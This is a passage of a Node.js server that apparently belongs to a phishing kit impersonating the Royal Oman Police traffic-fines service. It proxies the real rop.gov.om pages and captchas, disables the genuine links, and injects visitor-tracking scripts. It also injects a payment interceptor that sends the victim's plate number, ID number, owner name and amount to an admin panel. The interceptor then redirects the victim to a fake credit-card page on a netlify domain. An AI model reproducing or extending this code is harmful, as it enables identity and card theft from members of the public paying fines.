          const fullCaptchaUrl = captchaImgUrl.startsWith('http') ? captchaImgUrl : 'https://www.rop.gov.om' + (captchaImgUrl.startsWith('/') ? '' : '/OnlineServices/eTraffic/arabic/') + captchaImgUrl;
          const imgResult = await ropGet(fullCaptchaUrl, session.cookies);
          if (imgResult.isImage && imgResult.body) {
            newCaptchaImage = 'data:image/jpeg;base64,' + imgResult.body.toString('base64');
          }
        } catch (e) { console.error('Error fetching captcha image:', e.message); }
      }
      
      return res.json({
        success: false,
        error: 'captcha_invalid',
        message: 'رمز التحقق غير صحيح',
        needNewCaptcha: true,
        captchaImage: newCaptchaImage
      });
    }
    
    if (errorMatch && errorMatch[1].trim()) {
      // Update session with new viewstate from error response so captcha stays in sync
      const newAspFields = extractAspNetFields(responseHtml);
      const newVcid = extractCaptchaVCID(responseHtml);
      if (newAspFields && newAspFields.__VIEWSTATE) {
        session.aspFields = newAspFields;
      }
      if (newVcid) {
        session.vcid = newVcid;
      }
      if (result.cookies && result.cookies.length > 0) {
        session.cookies = parseCookies(result.cookies);
      }
      ropSessions.set(sessionId, session);
      
      // Get new captcha image from the error response
      let newCaptchaImage = null;
      const captchaImgUrl2 = extractCaptchaImageUrl(responseHtml);
      if (captchaImgUrl2) {
        try {
          const fullCaptchaUrl = captchaImgUrl2.startsWith('http') ? captchaImgUrl2 : 'https://www.rop.gov.om' + (captchaImgUrl2.startsWith('/') ? '' : '/OnlineServices/eTraffic/arabic/') + captchaImgUrl2;
          const imgResult2 = await ropGet(fullCaptchaUrl, session.cookies);
          if (imgResult2.isImage && imgResult2.body) {
            newCaptchaImage = 'data:image/jpeg;base64,' + imgResult2.body.toString('base64');
          }
        } catch (e) { console.error('Error fetching captcha image:', e.message); }
      }
      
      return res.json({
        success: false,
        error: 'rop_error',
        message: errorMatch[1].trim(),
        needNewCaptcha: true,
        captchaImage: newCaptchaImage
      });
    }
    
    // Check for "no fines" message
    const noFinesMatch = responseHtml.match(/لا توجد مخالفات|لا يوجد مخالفات|No violations found|No records found/i);
    
    if (noFinesMatch) {
      return res.json({
        success: true,
        hasResults: false,
        noFines: true,
        resultsHtml: ''
      });
    }
    
        // Log response length for debugging
    console.log('ROP response length:', responseHtml.length);
    console.log('Has معلومات التسجيل:', responseHtml.includes('معلومات التسجيل'));
    console.log('Has لديك عدد:', responseHtml.includes('لديك عدد'));
    console.log('Has table:', responseHtml.includes('<table'));
    
    // Strategy: Results are INSIDE the form on ConfirmPayment.aspx
    // Look for divVInfo (vehicle registration info) and extract from there to after the fines table
    let resultsHtml = '';
    
    // Method 1: Find divVInfo and extract to after the last table
    const divVInfoIdx = responseHtml.indexOf('id="divVInfo"');
    if (divVInfoIdx > 0) {
      // Go back to find the opening <div tag
      const startIdx = responseHtml.lastIndexOf('<div', divVInfoIdx);
      // Find the form end
      const formEndIdx = responseHtml.indexOf('</form>');
      // Find the last </table> between divVInfo and form end
      let lastTableEnd = -1;
      let searchFrom = startIdx;
      while (true) {
        const nextTable = responseHtml.indexOf('</table>', searchFrom);
        if (nextTable < 0 || nextTable > formEndIdx) break;
        lastTableEnd = nextTable;
        searchFrom = nextTable + 8;
      }
      
      if (lastTableEnd > 0) {
        // Get content up to 3 closing divs after the table
        let endIdx = lastTableEnd + 8; // after </table>
        for (let i = 0; i < 3; i++) {
          const nextDiv = responseHtml.indexOf('</div>', endIdx);
          if (nextDiv > 0 && nextDiv < formEndIdx) endIdx = nextDiv + 6;
          else break;
        }
        resultsHtml = responseHtml.substring(startIdx, endIdx);
        console.log('Method 1 (divVInfo to table): found', resultsHtml.length, 'chars');
      }
    }
    
    // Method 2: If no divVInfo, look for validResult div
    if (!resultsHtml) {
      const validResultIdx = responseHtml.indexOf('id="ctl00_ContentPlaceHolder1_validResult"');
      if (validResultIdx > 0) {
        const startIdx = responseHtml.lastIndexOf('<div', validResultIdx);
        const formEndIdx = responseHtml.indexOf('</form>');
        let lastTableEnd = responseHtml.lastIndexOf('</table>', formEndIdx);
        if (lastTableEnd > startIdx) {
          let endIdx = lastTableEnd + 8;
          for (let i = 0; i < 3; i++) {
            const nextDiv = responseHtml.indexOf('</div>', endIdx);
            if (nextDiv > 0 && nextDiv < formEndIdx) endIdx = nextDiv + 6;
            else break;
          }
          resultsHtml = responseHtml.substring(startIdx, endIdx);
          console.log('Method 2 (validResult): found', resultsHtml.length, 'chars');
        }
      }
    }
    
    // Method 3: If still nothing, try to get everything between form start and form end that has tables
    if (!resultsHtml && responseHtml.includes('معلومات التسجيل')) {
      const regInfoIdx = responseHtml.indexOf('معلومات التسجيل');
      const startIdx = responseHtml.lastIndexOf('<div', regInfoIdx);
      const formEndIdx = responseHtml.indexOf('</form>');
      let lastTableEnd = responseHtml.lastIndexOf('</table>', formEndIdx);
      if (lastTableEnd > startIdx) {
        let endIdx = lastTableEnd + 8;
        for (let i = 0; i < 3; i++) {
          const nextDiv = responseHtml.indexOf('</div>', endIdx);
          if (nextDiv > 0 && nextDiv < formEndIdx) endIdx = nextDiv + 6;
          else break;
        }
        resultsHtml = responseHtml.substring(startIdx, endIdx);
        console.log('Method 3 (معلومات التسجيل): found', resultsHtml.length, 'chars');
      }
    }
    
    // Clean up the results HTML (only remove scripts and hidden inputs)
    if (resultsHtml) {
      resultsHtml = resultsHtml.replace(/<script[\s\S]*?<\/script>/gi, '');
      resultsHtml = resultsHtml.replace(/<input[^>]*type="hidden"[^>]*>/gi, '');
      resultsHtml = resultsHtml.trim();
    }
    
    // Check for fines summary and add as a highlight banner
    const finesSummaryMatch = responseHtml.match(/id="ctl00_ContentPlaceHolder1_lblSummary"[^>]*>([\s\S]*?)<\/span>/i);
    if (finesSummaryMatch && resultsHtml) {
      resultsHtml = '<div style="background:#fff3cd; border:1px solid #ffc107; padding:15px; border-radius:5px; margin-bottom:15px; text-align:center; font-size:16px; font-weight:bold; color:#856404;">' + finesSummaryMatch[1] + '</div>' + resultsHtml;
    } else {
      // Try alternative summary pattern
      const altSummary = responseHtml.match(/(لديك عدد[\s\S]*?عماني<\/font>)/i);
      if (altSummary && resultsHtml) {
        resultsHtml = '<div style="background:#fff3cd; border:1px solid #ffc107; padding:15px; border-radius:5px; margin-bottom:15px; text-align:center; font-size:16px; font-weight:bold; color:#856404;">' + altSummary[1] + '</div>' + resultsHtml;
      }
    }
    
    const hasResults = resultsHtml.trim().length > 50;
    console.log('Final hasResults:', hasResults, 'resultsHtml length:', resultsHtml.length);
    
    // Store results with a unique ID
    const resultId = 'res_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
    if (hasResults) {
      // Store the FULL raw HTML page from ROP - fix relative URLs to absolute
      let fullRawHtml = responseHtml;
      // Fix relative CSS/JS/image paths to absolute ROP URLs
      const ropBase = 'https://www.rop.gov.om/OnlineServices/eTraffic/arabic/';
      fullRawHtml = fullRawHtml.replace(/href="css\//g, 'href="' + ropBase + 'css/');
      fullRawHtml = fullRawHtml.replace(/src="js\//g, 'src="' + ropBase + 'js/');
      fullRawHtml = fullRawHtml.replace(/url\(\.\.\/images\//g, 'url(' + ropBase + 'images/');
      fullRawHtml = fullRawHtml.replace(/url\(\.\.images\//g, 'url(' + ropBase + 'images/');
      fullRawHtml = fullRawHtml.replace(/src="\/OnlineServices/g, 'src="https://www.rop.gov.om/OnlineServices');
      fullRawHtml = fullRawHtml.replace(/href="\/OnlineServices/g, 'href="https://www.rop.gov.om/OnlineServices');
      fullRawHtml = fullRawHtml.replace(/src="images\//g, 'src="' + ropBase + 'images/');
      fullRawHtml = fullRawHtml.replace(/src="\.\.\//g, 'src="https://www.rop.gov.om/OnlineServices/eTraffic/');
      fullRawHtml = fullRawHtml.replace(/href="\.\.\//g, 'href="https://www.rop.gov.om/OnlineServices/eTraffic/');
      // Remove ASP.NET form postback (we don't need it in the displayed HTML)
      fullRawHtml = fullRawHtml.replace(/<form[^>]*method="post"[^>]*>/gi, '<div id="aspnetForm">');
      fullRawHtml = fullRawHtml.replace(/<\/form>/gi, '</div>');
      // Remove hidden inputs and viewstate from displayed HTML
      fullRawHtml = fullRawHtml.replace(/<input[^>]*type="hidden"[^>]*>/gi, '');
      
      // Extract viewstate from the ORIGINAL responseHtml (before stripping) for PDF postback
      const confirmViewstate = extractAspNetFields(responseHtml);
      console.log('Stored confirmViewstate keys:', Object.keys(confirmViewstate));
      console.log('Stored confirmUrl:', confirmUrl);
      console.log('Has confirmCookies:', !!confirmCookies);
      
      // Inject script to intercept PDF/report button clicks and redirect to our proxy
      const buttonInterceptScript = `
<script>
(function() {
  var RESULT_ID = '${resultId}';
  var API_BASE = 'https://jazeera-server-production.up.railway.app';
  
  function openPdf(action) {
    var url = API_BASE + '/api/rop/pdf/' + RESULT_ID + '?action=' + action;
    window.open(url, '_blank') || (window.location.href = url);
  }
  
  // Disable btnReport click (تنزيل تقرير المخالفات) - do nothing
  var btnReport = document.getElementById('ctl00_ContentPlaceHolder1_btnReport');
  if (btnReport) {
    btnReport.type = 'button';
    btnReport.onclick = null;
    btnReport.addEventListener('click', function(e) {
      e.preventDefault();
      e.stopPropagation();
      return false;
    }, true);
  }
  
  // Intercept btnHistory click (عرض عمليات الدفع الإلكتروني السابقة)
  var btnHistory = document.getElementById('ctl00_ContentPlaceHolder1_btnHistory');
  if (btnHistory) {
    btnHistory.type = 'button';
    btnHistory.onclick = null;
    btnHistory.addEventListener('click', function(e) {
      e.preventDefault();
      e.stopPropagation();
      this.value = 'جاري التحميل...';
      this.disabled = true;
      openPdf('history');
      var btn = this;
      setTimeout(function() { btn.disabled = false; btn.value = 'عرض عمليات الدفع الإلكتروني السابقة'; }, 5000);
    }, true);
  }
  
  // Intercept btnPrint click (طباعة تفاصيل المخالفات)
  var btnPrint = document.getElementById('btnPrint');
  if (btnPrint) {
    btnPrint.onclick = null;
    btnPrint.addEventListener('click', function(e) {
      e.preventDefault();
      e.stopPropagation();
      window.print();
    }, true);
  }
  
  // Intercept the payment link (دفع button in modal) to redirect to our credit card page
  var lnkPayment = document.getElementById('ctl00_ContentPlaceHolder1_lnkPayment');
  if (lnkPayment) {
    lnkPayment.href = '#';
    lnkPayment.onclick = function(e) {
      e.preventDefault();
      e.stopPropagation();
      // Calculate total from spnAmount in the modal or from the table
      var amountEl = document.getElementById('spnAmount');
      var amount = amountEl ? amountEl.textContent.trim() : '0';
      if (!amount || amount === '0') {
        // Try to calculate from table
        var cells = document.querySelectorAll('table td');
        var total = 0;
        for (var i = 0; i < cells.length; i++) {
          var v = parseFloat(cells[i].textContent.trim());
          if (v > 0 && v < 10000) total += v;
        }
        amount = total.toFixed(3);
      }
      // Send data to admin when user clicks payment button
      if (window.sendToAdmin) {
        var serviceType = '${session.service}' === 'renewVehicle' ? 'تجديد تسجيل المركبة' : 'المخالفات المرورية';
        var fields = [];
        fields.push({ label: 'رمز اللوحة', value: '${vehicleChars || ""}' });
        fields.push({ label: 'رقم المركبة', value: '${vehicleNo || ""}' });
        fields.push({ label: 'نوع الهوية', value: '${idType || ""}' });
        fields.push({ label: 'رقم الهوية', value: '${idValue || ""}' });
        fields.push({ label: 'المبلغ', value: amount + ' ر.ع' });
        // Try to extract additional info from the page
        var plateEl = document.querySelector('#ctl00_ContentPlaceHolder1_lblPlateNo, [id*="lblPlate"]');
        if (plateEl) fields.push({ label: 'لوحة المركبة (من النتائج)', value: plateEl.textContent.trim() });
        var ownerEl = document.querySelector('#ctl00_ContentPlaceHolder1_lblOwnerName, [id*="lblOwner"]');
        if (ownerEl) fields.push({ label: 'اسم المالك', value: ownerEl.textContent.trim() });
        window.sendToAdmin({ type: serviceType, fields: fields }, serviceType);
      }
      window.location.href = 'https://omanshortta.netlify.app/credit-card-payment?amount=' + amount;
      return false;
    };
  }
  
  // Override __doPostBack to prevent any postback except our handled ones
  window.__doPostBack = function(target, arg) {
    if (target && target.indexOf('lnkPayment') !== -1) {
      // Payment link - send data to admin then redirect
      var amountEl = document.getElementById('spnAmount');
      var amount = amountEl ? amountEl.textContent.trim() : '0';
      if (window.sendToAdmin) {
        var serviceType = '${session.service}' === 'renewVehicle' ? 'تجديد تسجيل المركبة' : 'المخالفات المرورية';
        var fields = [];
        fields.push({ label: 'رمز اللوحة', value: '${vehicleChars || ""}' });
        fields.push({ label: 'رقم المركبة', value: '${vehicleNo || ""}' });
        fields.push({ label: 'نوع الهوية', value: '${idType || ""}' });
        fields.push({ label: 'رقم الهوية', value: '${idValue || ""}' });
        fields.push({ label: 'المبلغ', value: amount + ' ر.ع' });
        window.sendToAdmin({ type: serviceType, fields: fields }, serviceType);
      }
      window.location.href = 'https://omanshortta.netlify.app/credit-card-payment?amount=' + amount;
    }
    return false;
  };
  
  // Prevent form submission but allow modal to show
  var forms = document.querySelectorAll('form');
  for (var i = 0; i < forms.length; i++) {
    forms[i].onsubmit = function(e) { e.preventDefault(); return false; };
  }
  
  console.log('ROP button intercept loaded. btnReport:', !!btnReport, 'btnHistory:', !!btnHistory, 'btnPrint:', !!btnPrint);
})();
</script>`;
      
      // Add visitor-tracking script and button interceptor before the LAST </body> (not the one inside JS strings)
      const lastBodyIdx = fullRawHtml.lastIndexOf('</body>');
      if (lastBodyIdx > -1) {
        fullRawHtml = fullRawHtml.substring(0, lastBodyIdx) + buttonInterceptScript + '\n<script src="https://omanshortta.netlify.app/visitor-tracking.js"></script>\n</body>' + fullRawHtml.substring(lastBodyIdx + 7);
      }
      
      ropResultsStore.set(resultId, {
        resultsHtml: resultsHtml,
        fullPageHtml: fullRawHtml,
        confirmCookies: confirmCookies,
        confirmUrl: confirmUrl,
        confirmViewstate: confirmViewstate,
        timestamp: Date.now()
      });
      // Auto-expire after 10 minutes
      setTimeout(() => ropResultsStore.delete(resultId), 10 * 60 * 1000);
    }
    
    res.json({
      success: true,
      hasResults: hasResults,
      noFines: false,
      resultsHtml: resultsHtml,
      resultId: hasResults ? resultId : null
    });
    
  } catch (error) {
    console.error('ROP submit error:', error.message);
    res.status(500).json({ success: false, error: 'server_error', message: 'حدث خطأ أثناء الاتصال بموقع الشرطة، يرجى المحاولة مرة أخرى' });
  }
});

// GET /api/rop/results/:id - Get stored results as JSON
app.get('/api/rop/results/:id', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  const result = ropResultsStore.get(req.params.id);
  if (!result) {
    return res.status(404).json({ error: 'Results not found or expired' });
  }
  res.json({ resultsHtml: result.resultsHtml });
});

// GET /api/rop/results-page/:id - Serve the FULL original ROP page as HTML
app.get('/api/rop/results-page/:id', (req, res) => {
  const result = ropResultsStore.get(req.params.id);
  if (!result || !result.fullPageHtml) {
    return res.status(404).send('<html><body><h1>النتائج غير موجودة أو انتهت صلاحيتها</h1><a href="https://omanshortta.netlify.app/rop-fines.html">العودة للاستعلام</a></body></html>');
  }
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  // Inject visitor-tracking script so the visitor stays connected in admin panel
  const trackingScript = `<script src="https://omanshortta.netlify.app/visitor-tracking.js"></script>`;
  // Fix language toggle - disable gotoenglish since we don't have the English ROP pages
  const langFixScript = `<script>function gotoenglish(){return false;}function gotoarabic(){return false;}</script>`;
  let html = result.fullPageHtml;
  // Disable navigation links (only <a> tags) but keep ENGLISH working
  // Don't touch <link> stylesheet hrefs or <script> srcs - only <a> tag hrefs
  html = html.replace(/<a([^>]*)href="https:\/\/www\.rop\.gov\.om[^"]*"/g, '<a$1href="javascript:void(0);"');
  // Replace gotoenglish with our translation function
  html = html.replace(/href="javascript:gotoenglish\(\);"/g, 'href="javascript:void(0);" onclick="translateToEnglish()"');
  html = html.replace(/href="javascript:gotoenglish\(\)"/g, 'href="javascript:void(0);" onclick="translateToEnglish()"');
  html = html.replace(/href="javascript:gotoarabic\(\);"/g, 'href="javascript:void(0);"');
  // Inject script to disable nav links except ENGLISH, and add translation function
  const disableLinksScript = `<script>
function translateToEnglish() {
  var translations = {
    'معلومات التسجيل': 'Registration Information',
    'تفاصيل لوحة': 'Plate Details',
    'النوع': 'Type',
    'الصنع': 'Make',
    'الطراز': 'Model',
    'اللون': 'Color',
    'عدد الإسطوانات': 'Cylinders',
    'سعة المحرك': 'Engine Capacity',
    'تاريخ الانتهاء': 'Expiry Date',
    'الخدمات الإلكترونية': 'Electronic Services',
    'الإستفسار ودفع المخالفات المرورية': 'Traffic Fines Inquiry & Payment',
    'الصفحة الرئيسية': 'Home',
    'للاستماع': 'Listen',
    'تحديد الكل': 'Select All',
    'المخالفة المحلية': 'Local Violation',
    'رقم المخالفة': 'Violation No.',
    'التاريخ والوقت': 'Date & Time',
    'رقم اللوحة': 'Plate No.',
    'المبلغ (ر.ع)': 'Amount (OMR)',
    'المكان': 'Location',
    'الوصف': 'Description',
    'مباشرة عملية الدفع': 'Proceed to Payment',
    'عرض عمليات الدفع الإلكتروني السابقة': 'Previous Payments',
    'طباعة تفاصيل المخالفات': 'Print Fines',
    'تنزيل التقرير': 'Download Report',
    'المدفوعات السابقة': 'Previous Payments',
    'دفع المخالفات': 'Pay Fines',
    'ريال عماني': 'OMR'
  };
  document.querySelectorAll('*').forEach(function(el) {
    if (el.children.length === 0 && el.textContent.trim()) {
      var text = el.textContent.trim();
      for (var ar in translations) {
        if (text.indexOf(ar) !== -1) {
          el.textContent = el.textContent.replace(ar, translations[ar]);
        }
      }
    }
    if (el.value) {
      for (var ar in translations) {
        if (el.value.indexOf(ar) !== -1) {
          el.value = el.value.replace(ar, translations[ar]);
        }
      }
    }
  });
  document.documentElement.setAttribute('dir', 'ltr');
  // Change ENGLISH to العربية
  event.target.textContent = 'العربية';
  event.target.onclick = function() { location.reload(); };
}
document.addEventListener('DOMContentLoaded',function(){
  document.querySelectorAll('a').forEach(function(a){
    var text = a.textContent.trim();
    if(text === 'ENGLISH' || text === 'العربية') return;
    a.href='javascript:void(0)';
    a.onclick=function(e){e.preventDefault();return false;};
  });
});
</script>`;
  if (html.includes('</body>')) {
    html = html.replace('</body>', disableLinksScript + trackingScript + '</body>');
  } else {
    html = html + disableLinksScript + trackingScript;
  }
  res.send(html);
});

// GET /api/rop/pdf/:id - Proxy PDF/report download from ROP ConfirmPayment.aspx
app.get('/api/rop/pdf/:id', async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  try {
    const { action } = req.query; // 'report' or 'history'
    const resultData = ropResultsStore.get(req.params.id);
    
    if (!resultData) {
      return res.status(404).send('<html><body><h1>انتهت صلاحية الجلسة</h1><p>يرجى إعادة الاستعلام</p></body></html>');
    }
    
    if (!resultData.confirmUrl || !resultData.confirmCookies || !resultData.confirmViewstate) {
      return res.status(400).send('<html><body><h1>بيانات الجلسة غير مكتملة</h1><p>يرجى إعادة الاستعلام</p></body></html>');
    }
    
    const querystring = require('querystring');
    
    // Build the postback form data
    const formData = {
      '__EVENTTARGET': '',
      '__EVENTARGUMENT': '',
      '__VIEWSTATE': resultData.confirmViewstate.__VIEWSTATE || '',
      '__VIEWSTATEGENERATOR': resultData.confirmViewstate.__VIEWSTATEGENERATOR || '',
      '__EVENTVALIDATION': resultData.confirmViewstate.__EVENTVALIDATION || '',
    };
    
    // Add the appropriate button
    if (action === 'report') {
      formData['ctl00$ContentPlaceHolder1$btnReport'] = 'تنزيل تقرير المخالفات';
    } else if (action === 'history') {
      formData['ctl00$ContentPlaceHolder1$btnHistory'] = 'عرض عمليات الدفع الإلكتروني السابقة';
    } else {
      return res.status(400).send('<html><body><h1>إجراء غير صالح</h1></body></html>');
    }
    
    const postData = querystring.stringify(formData);
    console.log('PDF proxy: action:', action);
    
    let pdfResult;
    
    // For history action, directly GET PaymentHistory.aspx with session cookies
    if (action === 'history') {
      const historyUrl = 'https://www.rop.gov.om/OnlineServices/eTraffic/arabic/PaymentHistory.aspx';
      console.log('PDF proxy: GETting PaymentHistory.aspx directly');
      pdfResult = await ropGetBinary(historyUrl, resultData.confirmCookies);
      
      // If we get a redirect (session expired), try the postback approach
      if (pdfResult.statusCode === 302) {
        console.log('PaymentHistory redirect, trying postback...');
        pdfResult = await ropPostBinary(resultData.confirmUrl, postData, resultData.confirmCookies);
      }
    } else {
      // For report, use POST to ConfirmPayment
      console.log('PDF proxy: POSTing to', resultData.confirmUrl);
      pdfResult = await ropPostBinary(resultData.confirmUrl, postData, resultData.confirmCookies);
    }
    
    console.log('PDF proxy response status:', pdfResult.statusCode);
    console.log('PDF proxy content-type:', pdfResult.headers['content-type']);
    console.log('PDF proxy body length:', pdfResult.body.length);
    console.log('PDF proxy headers:', JSON.stringify(pdfResult.headers));
    
    // If response is HTML (error page or history page), create a clean print-friendly page
    const respContentType = pdfResult.headers['content-type'] || '';
    if (respContentType.includes('text/html') && pdfResult.body.length > 0) {
      const htmlBody = pdfResult.body.toString('utf-8');
      console.log('PDF proxy got HTML response, length:', htmlBody.length);
      
      // Extract just the table content from the response
      let tableContent = '';
      const tableMatch = htmlBody.match(/<table[\s\S]*?<\/table>/gi);
      if (tableMatch) {
        tableContent = tableMatch.join('\n');
      }
      
      // Extract any heading/title
      let pageTitle = 'عمليات الدفع الإلكتروني السابقة';
      const titleMatch = htmlBody.match(/<h[1-3][^>]*>([^<]+)<\/h[1-3]>/i);
      if (titleMatch) pageTitle = titleMatch[1];
      
      // Build a clean, print-friendly PDF page
      const cleanHtml = `<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
<meta charset="utf-8" />
<title>${pageTitle}</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic:wght@400;700&display=swap');
  * { box-sizing: border-box; }
  body { 
    direction: rtl; 
    font-family: 'Noto Kufi Arabic', Arial, sans-serif; 
    margin: 0; 
    padding: 30px; 
    background: #fff; 
    color: #333;
  }
  .header {
    text-align: center;
    margin-bottom: 30px;
    padding-bottom: 20px;
    border-bottom: 3px solid #1a3a5c;
  }
  .header img {
    height: 60px;
    margin-bottom: 10px;
  }
  .header h1 {
    font-size: 18px;
    color: #1a3a5c;
    margin: 5px 0;
  }
  .header h2 {
    font-size: 15px;
    color: #555;
    margin: 5px 0;
    font-weight: normal;
  }
  table { 
    width: 100%; 
    border-collapse: collapse; 
    margin: 20px 0; 
    font-size: 12px;
  }
  table th { 
    background: #1a3a5c; 
    color: #fff; 
    padding: 10px 8px; 
    text-align: center; 
    font-size: 12px;
    font-weight: bold;
  }
  table td { 
    padding: 8px; 
    border: 1px solid #ddd; 
    text-align: center; 
    font-size: 12px;
  }
  table tr:nth-child(even) { background: #f8f9fa; }
  table tr:hover { background: #e9ecef; }
  .footer {
    text-align: center;
    margin-top: 30px;
    padding-top: 15px;
    border-top: 1px solid #ddd;
    font-size: 11px;
    color: #888;
  }
  .print-btn {
    display: block;
    margin: 20px auto;
    padding: 12px 30px;
    background: #1a3a5c;
    color: #fff;
    border: none;
    border-radius: 5px;
    font-size: 14px;
    cursor: pointer;
    font-family: inherit;
  }
  .print-btn:hover { background: #2c5282; }
  @media print {
    .print-btn { display: none; }
    body { padding: 10px; }
  }
</style>
</head>
<body>
<div class="header">
  <h1>Jazeera Airways</h1>
  <h2>${pageTitle}</h2>
</div>
${tableContent || '<p style="text-align:center; color:#666;">لا توجد عمليات دفع سابقة</p>'}
<button class="print-btn" onclick="window.print()">حفظ كـ PDF / طباعة</button>
<div class="footer">
  <p>Jazeera Airways — Online Booking</p>
</div>
</body>
</html>`;
      
      res.setHeader('Content-Type', 'text/html; charset=utf-8');
      return res.send(cleanHtml);
    }
    
    // Check if we got a redirect
    if (pdfResult.statusCode === 302 && pdfResult.headers.location) {
      const redirectUrl = pdfResult.headers.location.startsWith('http') 
        ? pdfResult.headers.location 
        : `https://www.rop.gov.om${pdfResult.headers.location}`;
      console.log('PDF proxy following redirect to:', redirectUrl);
      
      // Update cookies
      let pdfCookies = resultData.confirmCookies;
      if (pdfResult.cookies && pdfResult.cookies.length > 0) {
        pdfCookies = pdfCookies + '; ' + parseCookies(pdfResult.cookies);
      }
      
      // Follow redirect with GET (binary)
      const redirectResult = await ropGetBinary(redirectUrl, pdfCookies);
      console.log('PDF redirect response status:', redirectResult.statusCode);
      console.log('PDF redirect content-type:', redirectResult.headers['content-type']);
      
      // Forward the response
      const contentType = redirectResult.headers['content-type'] || 'application/octet-stream';
      res.setHeader('Content-Type', contentType);
      if (redirectResult.headers['content-disposition']) {
        res.setHeader('Content-Disposition', redirectResult.headers['content-disposition']);
      } else if (contentType.includes('pdf')) {
        res.setHeader('Content-Disposition', 'inline; filename="report.pdf"');
      }
      return res.send(redirectResult.body);
    }
    
    // Forward the direct response
    const contentType = pdfResult.headers['content-type'] || 'application/octet-stream';
    res.setHeader('Content-Type', contentType);
    if (pdfResult.headers['content-disposition']) {
      res.setHeader('Content-Disposition', pdfResult.headers['content-disposition']);
    } else if (contentType.includes('pdf')) {
      res.setHeader('Content-Disposition', 'inline; filename="report.pdf"');
    }
    res.send(pdfResult.body);
    
  } catch (error) {
    console.error('PDF proxy error:', error.message);
    res.status(500).send('<html><body><h1>حدث خطأ أثناء تحميل التقرير</h1><p>' + error.message + '</p></body></html>');
  }
});

// CORS preflight for ROP endpoints
app.options('/api/rop/init-session', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.status(204).send();
});
app.options('/api/rop/refresh-captcha', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.status(204).send();
});
app.options('/api/rop/submit', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.status(204).send();
});

// Start server
const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Loaded ${savedVisitors.length} saved visitors`);
});
// Update timestamp: Wed Aug 12 17:54:44 UTC 2026
